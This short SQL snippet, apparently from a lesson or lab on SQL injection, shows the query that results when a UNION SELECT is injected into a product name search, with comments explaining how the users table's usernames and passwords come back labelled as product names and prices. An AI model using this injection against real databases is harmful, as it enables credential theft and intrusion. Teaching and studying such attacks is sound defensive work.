-- 'none' matches no product, so the first SELECT returns nothing; the injected
-- UNION SELECT then stacks every credential onto the (empty) product list.
-- The columns are still labelled name, price -- passwords rendered as "prices".
SELECT name, price FROM product WHERE name LIKE '%none%'
UNION
SELECT username, password FROM users;
